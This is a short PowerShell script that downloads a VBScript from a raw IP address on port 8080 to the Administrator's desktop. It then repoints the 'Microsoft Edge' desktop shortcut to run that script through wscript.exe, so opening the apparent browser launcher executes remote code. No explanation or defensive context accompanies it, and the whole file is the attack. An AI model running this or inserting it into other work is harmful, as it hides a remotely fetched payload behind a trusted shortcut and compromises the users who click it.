$wsshell = New-Object -ComObject WScript.shell

$shortcutPath = "C:\Users\Administrator\Desktop\Microsoft Edge.lnk"

$shortcut = $wsshell.CreateShortcut($shortcutPath)

Invoke-WebRequest -Uri "http://54.209.180.198:8080/vbscript.vbs" -OutFile "C:\Users\Administrator\Desktop\vbscript.vbs"

$shortcut.TargetPath = "wscript.exe"
$shortcut.Arguments = "C:\Users\Administrator\Desktop\vbscript.vbs"

$shortcut.save()